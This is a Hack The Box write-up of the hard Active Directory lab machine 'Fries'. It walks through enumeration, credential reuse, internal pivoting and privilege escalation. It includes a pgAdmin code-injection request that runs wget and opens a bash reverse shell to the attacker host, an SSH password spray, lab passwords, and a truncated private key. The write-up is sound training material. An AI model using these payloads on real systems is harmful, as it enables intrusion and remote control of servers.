---
title: Fries
summary: Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), SSH (22), HTTP (80).
date: 2026-08-17
tags: [Hack The Box, Active Directory, Windows]
difficulty: hard
os: Windows
url: https://app.hackthebox.com/machines/Fries
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Fries%20-%20Hard%20AD/Fries%20%5BHard%5D%20%5BAD%5D.md
---

# Fries
## Machine Information
Please allow up to 7 minutes for services to load. As is common in real life Windows penetration tests, you will start the Fries box with credentials for the following account : d.cooper@fries.htb / D4LE11maan!!

```python
d.cooper:D4LE11maan!!
```

## Host file setup
```python
sudo nxc smb 10.129.244.72 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

## Enumeration
### Open ports
```python
nmap -p- --min-rate=2000 -sT dc01.fries.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-17 18:40 +0100
Nmap scan report for dc01.fries.htb (10.129.244.72)
Host is up (0.015s latency).
rDNS record for 10.129.244.72: DC01.fries.htb
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49681/tcp open  unknown
49682/tcp open  unknown
49684/tcp open  unknown
49693/tcp open  unknown
49917/tcp open  unknown
49934/tcp open  unknown
49975/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.32 seconds
```

### Nmap
```python
nmap -p 22,53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,5985 -A --min-rate=2000 -sT dc01.fries.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-17 18:43 +0100
Nmap scan report for dc01.fries.htb (10.129.244.72)
Host is up (0.015s latency).
rDNS record for 10.129.244.72: DC01.fries.htb

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://fries.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-18 00:43:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2026-06-05T16:23:40
|_Not valid after:  2106-06-05T16:23:40
|_ssl-date: 2026-08-18T00:44:56+00:00; +6h59m57s from scanner time.
443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
| Not valid before: 2025-06-01T22:06:09
|_Not valid after:  2026-06-01T22:06:09
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-18T00:44:57+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2026-06-05T16:23:40
|_Not valid after:  2106-06-05T16:23:40
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-18T00:44:57+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2026-06-05T16:23:40
|_Not valid after:  2106-06-05T16:23:40
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2026-06-05T16:23:40
|_Not valid after:  2106-06-05T16:23:40
|_ssl-date: 2026-08-18T00:44:57+00:00; +6h59m57s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (91%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 2.6.32 - 3.13 (85%), Linux 3.10 - 4.11 (85%), Linux 3.2 - 4.14 (85%), Linux 3.4 - 3.10 (85%), Linux 4.15 (85%), Linux 5.14 - 6.8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```

Some interesting services running

## SMB (445)

Null auth doesnt give me anything

Guest account is also disabled

### Using provided credentials
```python
nxc smb dc01.fries.htb -u 'd.cooper' -p 'D4LE11maan!!' 
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.72   445    DC01             [-] fries.htb\d.cooper:D4LE11maan!! STATUS_LOGON_FAILURE
```

So these credentials dont work on SMB

## SSH (22)

```python
ssh d.cooper@dc01.fries.htb            
The authenticity of host 'dc01.fries.htb (10.129.244.72)' can't be established.
ED25519 key fingerprint is: SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dc01.fries.htb' (ED25519) to the list of known hosts.
d.cooper@dc01.fries.htb's password:
```

So the credentials get me access here either!

Also worth noting that its using password auth

## HTTP (80)

![Screenshot](images/fries/pasted-image-20260817185300.webp)

No login portal here so i cannot use credentials!

Also not a lot on the website in terms of functionality

![Screenshot](images/fries/pasted-image-20260817194210.webp)

Found some potential users

If i know d.cooper is a valid user i can take the same format for these names

```python
e.thompson
d.rodriguez
s.chen
d.cooper
```

I can now run this list against kerbrute to see if they are valid

Only `d.cooper` is valid

### Subdomains
```python
ffuf -u http://fries.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.fries.htb' -ic -c -t 30 -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://fries.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.fries.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

code                    [Status: 200, Size: 13593, Words: 1048, Lines: 272, Duration: 41ms]
:: Progress: [114438/114438] :: Job [1/1] :: 2112 req/sec :: Duration: [0:01:16] :: Errors: 0 ::
```

Found a subdomain `code`

## `code` subdomain 

This subdomain is a Gitea instance

There are no public or archived repos

![Screenshot](images/fries/pasted-image-20260817193726.webp)

There are two users however

![Screenshot](images/fries/pasted-image-20260817193850.webp)

Using the provided password on the user `dale` got me access to the instance!

I will have a look through this repo

![Screenshot](images/fries/pasted-image-20260817194724.webp)

So looks like there is another subdomain `db-mgmt05`, ill add to my hosts file

Also a screenshot in the repo of a `svc` user

Ill now look through the commit history

![Screenshot](images/fries/pasted-image-20260817194906.webp)

```python
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

## `db-mgmt05` subdomain

![Screenshot](images/fries/pasted-image-20260817195831.webp)

The credentials `d.cooper@fries.htb:D4LE11maan!!` got me access here

Now i should be able to access the database

![Screenshot](images/fries/pasted-image-20260817200356.webp)

Using the password found in the gitea instance `PsqLR00tpaSS11` i could log in as the root user and access the database

![Screenshot](images/fries/pasted-image-20260817201313.webp)

Ive had a quick look through, there is nothing interesting in the tables

But i can so some research on this version

It looks to be vulnerable to `CVE-2025-2945`

## CVE-2025-2945 RCE

![Screenshot](images/fries/pasted-image-20260817202948.webp)

So first ill select a DB on the left panel and right click and choose query tool

Then ill run a test query then using the `Execute Script` button, from here ill click `Save Results To File` in the data output section and proxy the request through Caido

Then in caido ill see a bunch of requests ill grab the POST rrquest and send it to replay

```python
POST /sqleditor/query_tool/download/8940911 HTTP/1.1
Host: db-mgmt05.fries.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-pgA-CSRFToken: ImI1ODc1OGY0NTIwODEyMjExMTUxYTVmZDZlYjA0MTgyZDJhNDgyMDYi.aoPDHA.nKY3l9kaRFEj5n3MCYWF2aJWZjc
Content-Length: 60
Origin: http://db-mgmt05.fries.htb
Connection: keep-alive
Referer: http://db-mgmt05.fries.htb/sqleditor/panel/8940911?is_query_tool=true&sgid=2&sid=2&did=16409&database_name=gitea
Cookie: pga4_session=bc8d3959-2ea9-4cdb-8e13-b5f79457ce5d!8NkQJMfKNMvE0AoFGQCbSfE/gqzOrSkBxsD5B2GNjkY=; PGADMIN_LANGUAGE=en
Priority: u=0

{"filename":"data-1786995094761.csv","query_commited":false}
```

So after some research the RCE lies in the `query_commited` parameter

```python
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

So ill start up a wabserver

```python
POST /sqleditor/query_tool/download/7415033 HTTP/1.1
Host: db-mgmt05.fries.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-pgA-CSRFToken: IjQ1OTg1YTk5YmFhNjY1YzhkOGRmZGMxMGZjOTY1NzAxZTllYmY0NDQi.aoPIcg.zoMzAupIL0QmZYOR2pIyQeOUgSE
Content-Length: 60
Origin: http://db-mgmt05.fries.htb
Connection: keep-alive
Referer: http://db-mgmt05.fries.htb/sqleditor/panel/7415033?is_query_tool=true&sgid=2&sid=2&did=16409&database_name=gitea
Cookie: pga4_session=bc8d3959-2ea9-4cdb-8e13-b5f79457ce5d!8NkQJMfKNMvE0AoFGQCbSfE/gqzOrSkBxsD5B2GNjkY=; PGADMIN_LANGUAGE=en
Priority: u=0

{"filename":"data-1786996252089.csv","query_commited":"__import__('os').system('wget http://10.10.14.61/test.txt')"}
```

Then send the following request

![Screenshot](images/fries/pasted-image-20260817205256.webp)

I have RCE

And after some testing, it does not reflect output, so ill just get a shell!

## Shell as `pgadmin`

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

So firtst ill start a listener

```python
POST /sqleditor/query_tool/download/7415033 HTTP/1.1
Host: db-mgmt05.fries.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-pgA-CSRFToken: IjQ1OTg1YTk5YmFhNjY1YzhkOGRmZGMxMGZjOTY1NzAxZTllYmY0NDQi.aoPIcg.zoMzAupIL0QmZYOR2pIyQeOUgSE
Content-Length: 60
Origin: http://db-mgmt05.fries.htb
Connection: keep-alive
Referer: http://db-mgmt05.fries.htb/sqleditor/panel/7415033?is_query_tool=true&sgid=2&sid=2&did=16409&database_name=gitea
Cookie: pga4_session=bc8d3959-2ea9-4cdb-8e13-b5f79457ce5d!8NkQJMfKNMvE0AoFGQCbSfE/gqzOrSkBxsD5B2GNjkY=; PGADMIN_LANGUAGE=en
Priority: u=0

{"filename":"data-1786996252089.csv","query_commited":"__import__('os').system('bash -c \"exec bash -i &>/dev/tcp/10.10.14.61/1337 <&1\"')"}
```

Then ill send this request, with a shell i got from hack-tools frefox extension

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => cb46692a4590 10.129.244.72 Linux-x86_64 👤 pgadmin(5050) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[+] PTY upgrade successful via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/cb46692a4590~10.129.244.72-Linux-x86_64/2026_08_17-20_55_13-341.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
cb46692a4590:/pgadmin4$ whoami
pgadmin
cb46692a4590:/pgadmin4$
```

I now have a shell, on presumably the linux vm that is running

```python
cb46692a4590:/pgadmin4$ env
SHELL=/bin/bash
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
CORRUPTED_DB_BACKUP_FILE=
PGAPPNAME=pgAdmin 4 - CONN:1840860
HOSTNAME=cb46692a4590
SERVER_SOFTWARE=gunicorn/22.0.0
PWD=/pgadmin4
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
OAUTHLIB_INSECURE_TRANSPORT=1
PYTHONPATH=/pgadmin4
TERM=xterm-256color
SHLVL=3
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
cb46692a4590:/pgadmin4$
```

Found a password for what looks like the admin user on the pgadmin install!

Now my first instinct is to try and connect to the database running that i found earlier. But is looks as if theres nothing running locally on this machine apart from the web app

```python
cb46692a4590:/pgadmin4$ ifconfig 
eth0      Link encap:Ethernet  HWaddr BE:2C:24:C3:02:47  
          inet addr:172.18.0.4  Bcast:172.18.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:108241 errors:0 dropped:0 overruns:0 frame:0
          TX packets:82876 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:14861578 (14.1 MiB)  TX bytes:32470280 (30.9 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:72 errors:0 dropped:0 overruns:0 frame:0
          TX packets:72 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:4392 (4.2 KiB)  TX bytes:4392 (4.2 KiB)
```

So i think my plan is to upload a ligolo agent then try and use nmap to scan the internal network

```python
cb46692a4590:/pgadmin4$ which ping
/bin/ping
cb46692a4590:/pgadmin4$ ping 172.18.0.3
PING 172.18.0.3 (172.18.0.3): 56 data bytes
64 bytes from 172.18.0.3: seq=0 ttl=42 time=0.109 ms
64 bytes from 172.18.0.3: seq=1 ttl=42 time=0.115 ms
^C
--- 172.18.0.3 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 0.109/0.112/0.115 ms
cb46692a4590:/pgadmin4$ ping 172.18.0.5
PING 172.18.0.5 (172.18.0.5): 56 data bytes
64 bytes from 172.18.0.5: seq=0 ttl=42 time=0.512 ms
64 bytes from 172.18.0.5: seq=1 ttl=42 time=0.098 ms
^C
--- 172.18.0.5 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 0.098/0.305/0.512 ms
cb46692a4590:/pgadmin4$ 
```

it looks as if there is more to the network

So ill download the linux agent and proxy

## Using ligolo-ng to scan internal network

```python
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

So first ill host the agent

```python
cb46692a4590:/tmp$ wget http://10.10.14.61/agent
Connecting to 10.10.14.61 (10.10.14.61:80)
saving to 'agent'
agent                100% |**************************************************************| 6996k  0:00:00 ETA
'agent' saved
cb46692a4590:/tmp$ ls -la
total 7008
drwxrwxrwt    1 root     root          4096 Aug 18 03:19 .
drwxr-xr-x    1 root     root          4096 May 28  2025 ..
-rw-r--r--    1 pgadmin  root       7164088 Aug 18 03:19 agent
cb46692a4590:/tmp$ 
```

Then ill transfer the agent to the target

```python
sudo ./proxy -selfcert   
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.9.1

ligolo-ng »
```

Then ill start the proxy on my machine 

```python
cb46692a4590:/tmp$ ./agent -connect 10.10.14.61:11601 --ignore-cert
```

Then on the target ill trigger the connection back to me

```python
[Agent : pgadmin@cb46692a4590] » ifcreate --name ligolo
INFO[0588] Creating a new ligolo interface...

[Agent : pgadmin@cb46692a4590] » route_add --name ligolo --route 172.18.0.0/16
INFO[0612] Route created.

[Agent : pgadmin@cb46692a4590] » tunnel_start 
INFO[0628] Starting tunnel to pgadmin@cb46692a4590 (f2757087f701)
```

Then on the proxy ill select the session using the `session` command then create an interface called `ligolo` and add then routing info for the internal network then start the tunnel

```python
ping 172.18.0.5
PING 172.18.0.5 (172.18.0.5) 56(84) bytes of data.
64 bytes from 172.18.0.5: icmp_seq=1 ttl=64 time=16.3 ms
64 bytes from 172.18.0.5: icmp_seq=2 ttl=64 time=16.0 ms
64 bytes from 172.18.0.5: icmp_seq=3 ttl=64 time=15.6 ms
^C
--- 172.18.0.5 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2005ms
rtt min/avg/max/mdev = 15.632/15.955/16.270/0.260 ms
```

Now i can access the internal network from my machine

Now in order to figure out which hosts are up, ill use ping to determine how many systems there are

So i get responses from `172.18.0.1` to `172.18.0.6` so there are 6 hosts running

```python
nmap -n -sT -Pn --unprivileged --min-rate 10 --max-retries 1 172.18.0.1-6
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 16:44 +0100
Nmap scan report for 172.18.0.1
Host is up (0.055s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
2049/tcp open  nfs
3000/tcp open  ppp
8443/tcp open  https-alt

Nmap scan report for 172.18.0.2
Host is up (0.041s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
5000/tcp open  upnp

Nmap scan report for 172.18.0.3
Host is up (0.032s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
5432/tcp open  postgresql

Nmap scan report for 172.18.0.4
Host is up (0.041s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.18.0.5
Host is up (0.045s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap scan report for 172.18.0.6
Host is up (0.032s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8443/tcp open  https-alt

Nmap done: 6 IP addresses (6 hosts up) scanned in 5.61 seconds
```

So ill use a simple nmap scan, i dont want to run a speed scan over the tunnel, so ill slow the scan down

Now its clear where all the services are running

## SSH access

So before i try and connect to postgres i think its a good idea to compile the usernames ive found so far and also the same for the passwords

```python
root
svc
administrator
d.cooper
```

```python
D4LE11maan!!
Friesf00Ds2025!!
PsqLR00tpaSS11
y0st528wn1idjk3b9a
```

So now i have a usernames and passwords list, ill do a brute force

```python
nxc ssh dc01.fries.htb -u usernames.txt -p passwords.txt --continue-on-success
SSH         10.129.244.72   22     dc01.fries.htb   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.244.72   22     dc01.fries.htb   [-] root:D4LE11maan!!
SSH         10.129.244.72   22     dc01.fries.htb   [-] svc:D4LE11maan!!
SSH         10.129.244.72   22     dc01.fries.htb   [-] administrator:D4LE11maan!!
SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:D4LE11maan!!
SSH         10.129.244.72   22     dc01.fries.htb   [-] root:Friesf00Ds2025!!
SSH         10.129.244.72   22     dc01.fries.htb   [+] svc:Friesf00Ds2025!!  Linux - Shell access!
SSH         10.129.244.72   22     dc01.fries.htb   [-] administrator:Friesf00Ds2025!!
SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:Friesf00Ds2025!!
SSH         10.129.244.72   22     dc01.fries.htb   [-] root:PsqLR00tpaSS11
SSH         10.129.244.72   22     dc01.fries.htb   [-] administrator:PsqLR00tpaSS11
SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:PsqLR00tpaSS11
SSH         10.129.244.72   22     dc01.fries.htb   [-] root:y0st528wn1idjk3b9a
SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:y0st528wn1idjk3b9a
```

I have shell access for a user `svc`

```python
ssh svc@fries.htb
svc@fries.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Aug 18 11:12:17 PM UTC 2026

  System load:  0.0                Processes:             172
  Usage of /:   66.9% of 13.67GB   Users logged in:       0
  Memory usage: 49%                IPv4 address for eth0: 192.168.100.2
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Aug 18 23:04:55 2026 from 10.10.14.61
svc@web:~$
```

I now have access over SSH

```python
scp linpeas.sh svc@fries.htb:/tmp
svc@fries.htb's password: 
linpeas.sh
```

Ill upload linpeas to the target with scp

Im going to upload copyfail 

github.com/theori-io/copy-fail-CVE-2026-31431

## Root on SSH

```python
scp copy_fail_exp.py svc@dc01.fries.htb:/tmp 
svc@dc01.fries.htb's password: 
copy_fail_exp.py
```

Ill trnasfer the exploit to the target

```python
svc@web:/tmp$ python3 copy_fail_exp.py
# 
# 
# whoami
root
# 
```

I am now root!

I can now get the root flag

```python
-----BEGIN OPENSSH PRIVATE KEY-----
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
